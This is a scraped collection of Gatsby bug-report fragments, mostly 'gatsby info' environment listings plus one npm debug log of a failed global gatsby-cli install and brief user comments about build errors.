``` system: os: macos mojave 10.14.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 safari: 13.1.1 npmpackages: gatsby: ~2.13.x => 2.13.64 gatsby-background-image: ^0.8.0 => 0.8.3 gatsby-image: ~2.1.x => 2.1.4 gatsby-plugin-catch-links: ~2.0.9 => 2.0.15 gatsby-plugin-emotion: ~2.0.5 => 2.0.7 gatsby-plugin-favicon: ~3.1.5 => 3.1.6 gatsby-plugin-google-gtag: ~1.1.x => 1.1.4 gatsby-plugin-manifest: ~2.2.x => 2.2.5 gatsby-plugin-mdx: ^1.0.13 => 1.0.24 gatsby-plugin-postcss: ~2.1.x => 2.1.3 gatsby-plugin-react-helmet: ~3.1.x => 3.1.3 gatsby-plugin-remove-generator: ^1.0.4 => 1.0.4 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ~1.5.x => 1.5.0 gatsby-plugin-root-import: ~2.0.5 => 2.0.5 gatsby-plugin-sharp: ~2.2.x => 2.2.11 gatsby-plugin-sitemap: ~2.2.x => 2.2.20 gatsby-remark-copy-linked-files: ^2.1.28 => 2.1.28 gatsby-remark-external-links: ~0.0.4 => 0.0.4 gatsby-remark-images: ~3.1.x => 3.1.11 gatsby-remark-relative-images: ^0.2.2 => 0.2.3 gatsby-remark-responsive-iframe: ~2.2.x => 2.2.4 gatsby-source-filesystem: ~2.1.x => 2.1.9 gatsby-source-youtube-v2: ^1.0.1 => 1.0.1 gatsby-transformer-remark: ^2.5.0 => 2.6.14 gatsby-transformer-sharp: ~2.2.x => 2.2.6 npmglobalpackages: gatsby-cli: 2.12.29
node : v12.17.0
npm : 6.14.4 ###log > 0 info it worked if it ends with ok
> 1 verbose cli [
> 1 verbose cli 'c:\\\\program files\\\ odejs\\\ ode.exe',
> 1 verbose cli 'c:\\\\program files\\\ odejs\\\ ode_modules\\\ pm\\\\bin\\\ pm-cli.js',
> 1 verbose cli 'i',
> 1 verbose cli '-g',
> 1 verbose cli 'gatsby-cli'
> 1 verbose cli ]
> 2 info using npm@6.14.4
> 3 info using node@v12.17.0
> 4 verbose npm-session 3047db9aa71e7a16
> 5 silly install loadcurrenttree
> 6 silly install readglobalpackagedata
> 7 http fetch get 304 211ms (from cache)
> 8 silly fetchpackagemetadata error for gatsby-cli@latest unexpected end of json input while parsing near '...vmriwdlqr9t4t+9x/x3sz'
> 9 timing stage:rollbackfailedoptional completed in 1ms
> 10 timing stage:runtoplevellifecycles completed in 257ms
> 11 verbose stack syntaxerror: unexpected end of json input while parsing near '...vmriwdlqr9t4t+9x/x3sz'
> 11 verbose stack at json.parse (<anonymous>)
> 11 verbose stack at parsejson (c:\\program files\ odejs\ ode_modules\ pm\ ode_modules\\json-parse-better-errors\\index.js:7:17)
> 11 verbose stack at c:\\program files\ odejs\ ode_modules\ pm\ ode_modules\ ode-fetch-npm\\src\\body.js:96:50
> 11 verbose stack at processticksandrejections (internal/process/task_queues.js:97:5)
> 12 verbose cwd d:\\kiran\\portfolio\ esumeontheweb-gatsby
> 13 verbose windows_nt 10.0.17763
> 14 verbose argv "c:\\\\program files\\\ odejs\\\ ode.exe" "c:\\\\program files\\\ odejs\\\ ode_modules\\\ pm\\\\bin\\\ pm-cli.js" "i" "-g" "gatsby-cli"
> 15 verbose node v12.17.0
> 16 verbose npm v6.14.4
> 17 error unexpected end of json input while parsing near '...vmriwdlqr9t4t+9x/x3sz'
> 18 verbose exit [ 1, true ]
system: os: windows 10 cpu: (12) x64 intel(r) xeon(r) cpu e5-1650 v4 @ 3.60ghz binaries: yarn: 1.21.0 - c:\\users\\e\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.4 - c:\\users\\e\\appdata\ oaming\ pm\ pm.cmd languages: python: 3.7.4 - /c/users/e/appdata/local/programs/python/python37/python browsers: edge: 44.17763.831.0 npmpackages: gatsby: ^2.4.4 => 2.23.3 gatsby-cypress: 0.4.4 => 0.4.4 gatsby-plugin-react-helmet: ^3.0.6 => 3.3.4 gatsby-plugin-sharp: ^2.0.37 => 2.6.11
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.18.1 - /usr/local/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 83.0.4103.97 firefox: 74.0.1 safari: 13.1.1 npmpackages: gatsby: 2.19.39 => 2.19.39 gatsby-cli: ^2.7.2 => 2.7.2 gatsby-image: ^2.3.2 => 2.3.2 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-create-client-paths: ^2.0.5 => 2.0.5 gatsby-plugin-google-tagmanager: ^2.0.15 => 2.0.15 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-remove-trailing-slashes: ^2.0.11 => 2.0.11 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-sitemap: ^2.1.0 => 2.1.0 gatsby-plugin-styled-components: ^3.1.19 => 3.1.19 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-remark-images-contentful: ^2.3.2 => 2.3.2 gatsby-source-contentful: ^2.0.67 => 2.0.67 gatsby-source-filesystem: ^2.0.38 => 2.1.38 gatsby-transformer-json: ^2.1.11 => 2.1.11 gatsby-transformer-remark: ^2.3.12 => 2.3.12
``` system: os: macos mojave 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.15.2 - ~/.yarn/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 83.0.4103.97 edge: 83.0.478.45 firefox: 76.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-theme-notes: ^1.3.57 => 1.3.57 ```
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 14.4.0 - ~/.nvm/versions/node/v14.4.0/bin/node yarn: 1.17.3 - ~/.yarn/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.4.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 firefox: 76.0.1 safari: 13.1.1 npmpackages: gatsby: 2.21.22 => 2.21.22 gatsby-plugin-antd: ^2.1.0 => 2.2.0 gatsby-plugin-compression: ^0.0.1 => 0.0.1 gatsby-plugin-env-variables: ^1.0.1 => 1.0.2 gatsby-plugin-google-analytics: ^2.1.35 => 2.3.3 gatsby-plugin-groq: ^1.0.0-alpha.7 => 1.0.0-alpha.10 gatsby-plugin-hotjar-tracking: ^1.0.0 => 1.1.0 gatsby-plugin-import: ^2.1.4 => 2.1.5 gatsby-plugin-loadable-components-ssr: ^1.0.7 => 1.1.0 gatsby-plugin-manifest: ^2.0.29 => 2.4.10 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-no-javascript: ^2.0.5 => 2.0.5 gatsby-plugin-olark: ^1.0.0 => 1.0.0 gatsby-plugin-preact: ^3.1.25 => 3.3.2 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.3.3 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.0.11 => 2.3.3 gatsby-plugin-typescript: ^2.1.26 => 2.4.4 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-plugin-zopfli: ^1.3.2 => 1.3.2 gatsby-query-params: ^1.1.0 => 1.2.1 gatsby-source-filesystem: ^2.1.5 => 2.3.10 gatsby-source-sanity: ^5.0.5 => 5.0.6 npmglobalpackages: gatsby-cli: 2.12.44
``` other local gatsby sites still work on my machine
i've tried disabling some of the plugins, cleaning cache, removing yarn.lock and modules and installing from scratch, upgrading gatsby-cli, resizing terminal window **which for some reason actually works for a lot of people?????**, etc
i'm at a loss here, but was hoping maybe someone could make sense out of the error message referencing `recipegraphqlserver.json.lock` or pretty much any of this
i realize most likely i will need to provide a repo that reproduces this error but thought i would check first.
``` system: os: macos 10.14.2 cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz shell: 3.2.57 - /bin/bash binaries: node: 11.8.0 - /usr/local/bin/node npm: 6.9.0 - /usr/local/bin/npm languages: python: 3.7.3 browsers: chrome: 83.0.4103.97 firefox: 74.0.1 safari: 12.0.2 npmglobalpackages: gatsby-cli: 2.6.2
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-7700k cpu @ 4.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.0 - ~/.nvm/versions/node/v12.16.0/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.16.0/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 firefox: 77.0.1 safari: 13.1 npmpackages: gatsby: ^2.23.1 => 2.23.1 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.4.6 => 2.4.6 gatsby-plugin-eslint: ^2.0.5 => 2.0.8 gatsby-plugin-layout: ^1.3.3 => 1.3.3 gatsby-plugin-manifest: ^2.4.10 => 2.4.10 gatsby-plugin-offline: ^3.2.8 => 3.2.8 gatsby-plugin-react-helmet: ^3.3.3 => 3.3.3 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.3.3 => 2.3.3 gatsby-plugin-sharp: ^2.6.10 => 2.6.10 gatsby-plugin-typescript: ^2.1.19 => 2.4.4 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.3.10 => 2.3.10 gatsby-transformer-sharp: ^2.3.16 => 2.5.4 npmglobalpackages: gatsby-cli: 2.10.13 ```
system: os: macos 10.15.5 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 3.0.2 - /usr/local/bin/fish binaries: node: 10.16.3 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 safari: 13.1.1 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-load-script: ^1.1.0 => 1.1.0 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.44
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.2.0 - ~/.nvm/versions/node/v12.2.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.2.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 66.0.3 safari: 13.1 npmpackages: gatsby: ^2.15.15 => 2.20.14 gatsby-paginate: ^1.1.1 => 1.1.1 gatsby-plugin-feed: ^2.3.12 => 2.4.1 gatsby-plugin-google-tagmanager: ^2.1.9 => 2.2.1 gatsby-plugin-manifest: ^2.2.16 => 2.3.3 gatsby-plugin-netlify-cms: ^4.1.15 => 4.2.2 gatsby-plugin-nprogress: ^2.1.6 => 2.2.1 gatsby-plugin-offline: ^3.0.6 => 3.1.2 gatsby-plugin-postcss: ^2.2.1 => 2.2.1 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.7 => 3.2.1 gatsby-plugin-sharp: ^2.2.22 => 2.5.4 gatsby-plugin-sitemap: ^2.2.12 => 2.3.1 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-remark-copy-linked-files: ^2.1.19 => 2.2.1 gatsby-remark-images: ^3.1.22 => 3.2.2 gatsby-remark-prismjs: ^3.3.13 => 3.4.1 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-source-filesystem: ^2.1.22 => 2.2.2 gatsby-transformer-remark: ^2.6.22 => 2.7.1 gatsby-transformer-sharp: ^2.2.14 => 2.4.4
``` system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i5-2450m cpu @ 2.50ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.3 - /c/program files/python37/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.22 => 2.21.22 gatsby-image: ^2.4.3 => 2.4.3 gatsby-plugin-manifest: ^2.4.2 => 2.4.2 gatsby-plugin-offline: ^3.2.1 => 3.2.1 gatsby-plugin-purgecss: ^5.0.0 => 5.0.0 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sass: ^2.3.1 => 2.3.1 gatsby-plugin-sharp: ^2.6.2 => 2.6.2 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-source-google-docs: ^2.0.0-beta.9 => 2.0.0-beta.9 gatsby-source-google-spreadsheet: ^2.0.0 => 2.0.0 gatsby-transformer-remark: ^2.8.13 => 2.8.13 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 npmglobalpackages: gatsby-cli: 2.12.44
# gatsby info --clipboard system: os: linux 5.5 linux mint 19.3 (tricia) cpu: (4) x64 intel(r) core(tm) i5-2400 cpu @ 3.10ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.0 - /usr/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.5 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: firefox: 76.0 npmpackages: gatsby: ^2.21.29 => 2.23.1 gatsby-awesome-pagination: ^0.3.5 => 0.3.6 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-cli: ^2.12.44 => 2.12.44 gatsby-image: ^2.4.3 => 2.4.6 gatsby-plugin-advanced-sitemap: ^1.5.4 => 1.5.5 gatsby-plugin-catch-links: ^2.3.1 => 2.3.4 gatsby-plugin-feed: ^2.5.1 => 2.5.4 gatsby-plugin-force-trailing-slashes: ^1.0.4 => 1.0.4 gatsby-plugin-ghost-images: ^1.1.1 => 1.1.4 gatsby-plugin-local-search: ^1.1.1 => 1.1.1 gatsby-plugin-manifest: ^2.4.9 => 2.4.10 gatsby-plugin-offline: ^3.2.1 => 3.2.8 gatsby-plugin-postcss: ^2.3.1 => 2.3.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.3 gatsby-plugin-sharp: ^2.6.2 => 2.6.10 gatsby-plugin-styled-components: ^3.3.1 => 3.3.3 gatsby-source-filesystem: ^2.3.1 => 2.3.10 gatsby-source-ghost: ^4.0.4 => 4.0.5 gatsby-source-mysql: ^2.2.2 => 2.2.2 gatsby-transformer-sharp: ^2.5.2 => 2.5.4 npmglobalpackages: gatsby-cli: 2.12.44 some screenshots of dev console showing differences:
under 2.21.29
![socket io-2 21 29](
![socket io-ssl-2 21 29]( under 2.23.1
![mimetype-2 23 1](
![socket io-2 23 1](
![socket io-ssl-2 23 1](
``` system: os: macos 10.15.5 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - /usr/local/bin/node yarn: 1.21.1 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/local/bin/npm browsers: chrome: 83.0.4103.61 firefox: 71.0 safari: 13.1.1 npmpackages: gatsby: ^2.23.1 => 2.23.1 gatsby-image: 2.4.6 => 2.4.6 gatsby-plugin-catch-links: ^2.3.4 => 2.3.4 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-google-analytics: ^2.3.3 => 2.3.3 gatsby-plugin-manifest: ^2.4.10 => 2.4.10 gatsby-plugin-mdx: ^1.2.14 => 1.2.14 gatsby-plugin-react-helmet: ^3.3.3 => 3.3.3 gatsby-plugin-sharp: ^2.6.10 => 2.6.10 gatsby-plugin-simple-analytics: ^1.0.3 => 1.0.3 gatsby-plugin-theme-ui: ^0.3.0 => 0.3.0 gatsby-plugin-twitter: ^2.3.3 => 2.3.3 gatsby-remark-copy-linked-files: ^2.3.4 => 2.3.4 gatsby-remark-embedder: ^2.1.1 => 2.1.1 gatsby-remark-giphy: ^1.0.4 => 1.0.4 gatsby-remark-images: ^3.3.9 => 3.3.9 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-remark-social-cards: ^0.4.1 => 0.4.1 gatsby-source-filesystem: ^2.3.10 => 2.3.10 gatsby-transformer-remark: ^2.8.14 => 2.8.14 gatsby-transformer-sharp: ^2.5.4 => 2.5.4 npmglobalpackages: gatsby-cli: 2.7.54
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.3 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 74.0.1 safari: 13.1 npmglobalpackages: gatsby-cli: 2.4.2 gatsby: 2.13.32
system: os: macos 10.15.5 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 safari: 13.1.1 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.8.3
system: os: macos 10.15.5 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.3 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 83.0.4103.97 firefox: 76.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.21.33 => 2.23.0 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.4.3 => 2.4.6 gatsby-plugin-advanced-sitemap: ^1.5.4 => 1.5.5 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.3 gatsby-plugin-manifest: ^2.4.3 => 2.4.10 gatsby-plugin-netlify-cms: ^4.3.2 => 4.3.4 gatsby-plugin-netlify-cms-paths: ^1.3.0 => 1.3.0 gatsby-plugin-offline: ^3.2.2 => 3.2.8 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.3 gatsby-plugin-sass: ^2.3.1 => 2.3.3 gatsby-plugin-sharp: ^2.6.3 => 2.6.10 gatsby-remark-images: ^3.3.3 => 3.3.9 gatsby-remark-prismjs: ^3.5.1 => 3.5.3 gatsby-remark-reading-time: ^1.1.0 => 1.1.0 gatsby-remark-responsive-iframe: ^2.4.2 => 2.4.4 gatsby-source-filesystem: ^2.3.3 => 2.3.10 gatsby-transformer-remark: ^2.8.8 => 2.8.14 gatsby-transformer-sharp: ^2.5.2 => 2.5.4 npmglobalpackages: gatsby-cli: 2.12.38
``` system: os: macos 10.15.4 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.21.0 - /var/folders/82/v_28mld95zqd97n81x_c2kb00000gn/t/yarn--1591305860413-0.03955211442214068/node yarn: 1.22.4 - /var/folders/82/v_28mld95zqd97n81x_c2kb00000gn/t/yarn--1591305860413-0.03955211442214068/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 edge: 83.0.478.44 firefox: 77.0 safari: 13.1 npmpackages: gatsby: ^2.23.0 => 2.23.0 gatsby-background-image: ^1.0.1 => 1.1.1 gatsby-cli: ^2.12.43 => 2.12.43 gatsby-image: ^2.4.6 => 2.4.6 gatsby-plugin-google-analytics: ^2.3.3 => 2.3.3 gatsby-plugin-google-tagmanager: ^2.3.4 => 2.3.4 gatsby-plugin-lodash: ^3.3.3 => 3.3.3 gatsby-plugin-module-resolver: ^1.0.3 => 1.0.3 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.3.3 => 3.3.3 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-remove-generator: ^1.0.5 => 1.0.5 gatsby-plugin-remove-trailing-slashes: ^2.3.4 => 2.3.4 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.3.3 => 2.3.3 gatsby-plugin-schema-snapshot: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.6.10 => 2.6.10 gatsby-plugin-sitemap: ./plugins/gatsby-plugin-sitemap/ => 2.2.4 gatsby-plugin-styled-components: ^3.3.3 => 3.3.3 gatsby-plugin-typescript: ^2.4.4 => 2.4.4 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.10 => 1.1.10 gatsby-source-contentful: 2.3.14 => 2.3.14 gatsby-source-filesystem: ^2.3.10 => 2.3.10 gatsby-transformer-json: ^2.4.4 => 2.4.4 gatsby-transformer-sharp: ^2.5.4 => 2.5.4 gatsby-transformer-sqip: ^2.3.10 => 2.3.10
``` system: os: macos mojave 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh binaries: node: 12.12.0 - /usr/local/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 83.0.4103.61 firefox: 75.0 safari: 12.1.1 npmpackages: gatsby: ^2.22.3 => 2.22.3 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-client-side-redirect: ^1.1.0 => 1.1.0 gatsby-plugin-manifest: ^2.4.8 => 2.4.8 gatsby-plugin-meta-redirect: ^1.1.1 => 1.1.1 gatsby-plugin-offline: ^3.2.6 => 3.2.6 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.8 => 2.6.8 gatsby-plugin-styled-components: ^3.3.2 => 3.3.2 gatsby-source-drupal: ^3.5.7 => 3.5.7 gatsby-source-filesystem: ^2.3.7 => 2.3.7 gatsby-transformer-json: ^2.4.3 => 2.4.3 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.8.18 ```
i am just browsing on the latest chrome browser.
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.14.1 - /usr/local/bin/node npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 72.0.2 safari: 13.1 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.11.2 gatsby: 2.20.29
``` system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.0.16 - /bin/bash binaries: node: 12.16.3 - ~/.config/versions/node/v12.16.3/bin/node yarn: 1.22.4 - ~/.config/versions/node/v12.16.3/bin/yarn npm: 6.14.5 - ~/.config/versions/node/v12.16.3/bin/npm browsers: chrome: 83.0.4103.61 firefox: 76.0.1 npmpackages: gatsby: ^2.21.0 => 2.21.0 gatsby-cli: ^2.12.38 => 2.12.38 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-layout: ^1.3.2 => 1.3.2 gatsby-plugin-manifest: ^2.4.0 => 2.4.0 gatsby-plugin-offline: ^3.2.0 => 3.2.0 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-sass: ^2.3.0 => 2.3.0 gatsby-plugin-sentry: ^1.0.1 => 1.0.1 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-transitions: ^2.1.6 => 2.1.6 gatsby-plugin-typescript: ^2.4.2 => 2.4.2 gatsby-plugin-typescript-checker: ^1.1.1 => 1.1.1 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-transformer-sharp: ^2.5.0 => 2.5.0 npmglobalpackages: gatsby: 2.21.11
``` system: os: linux 4.19 ubuntu 20.04 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-1065g7 cpu @ 1.30ghz shell: 5.0.16 - /bin/bash binaries: node: 13.9.0 - ~/.nvm/versions/node/v13.9.0/bin/node yarn: 1.22.4 - /home/linuxbrew/.linuxbrew/bin/yarn npm: 6.13.7 - ~/.nvm/versions/node/v13.9.0/bin/npm npmpackages: gatsby: ^2.21.21 => 2.21.21 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-emotion: ^4.3.1 => 4.3.1 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-netlify-cms: ^4.3.1 => 4.3.1 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.3.1 => 2.3.1 gatsby-plugin-sharp: ^2.6.2 => 2.6.2 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-transformer-json: ^2.4.3 => 2.4.3 gatsby-transformer-remark: ^2.8.12 => 2.8.12 gatsby-transformer-sharp: ^2.5.2 => 2.5.2
``` system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (24) x64 amd ryzen 9 3900x 12-core processor shell: 4.4.20 - /bin/bash binaries: node: 12.16.2 - ~/.nvm/versions/node/v12.16.2/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.2/bin/npm npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-remark-prismjs: ^3.5.2 => 3.5.2 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-json: ^2.4.3 => 2.4.3 gatsby-transformer-remark: ^2.8.13 => 2.8.13 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.36 gatsby-dev-cli: 2.7.0 ```
``` system: os: macos 10.15.1 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.1 - /usr/local/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 safari: 13.0.3 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-source-filesystem: ^2.3.10 => 2.3.10 npmglobalpackages: gatsby-cli: 2.11.15 gatsby: 2.20.6
empty project, and currently ongoing projects leave the same warnings.
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-8569u cpu @ 2.80ghz shell: 5.0.17 - /opt/local/bin/bash binaries: node: 12.16.1 - ~/.asdf/installs/nodejs/12.16.1/bin/node npm: 6.13.4 - ~/.asdf/installs/nodejs/12.16.1/bin/npm languages: python: 3.8.2 - /users/challen/.asdf/shims/python npmpackages: gatsby: ^2.22.15 => 2.22.15 npmglobalpackages: gatsby-cli: 2.12.21
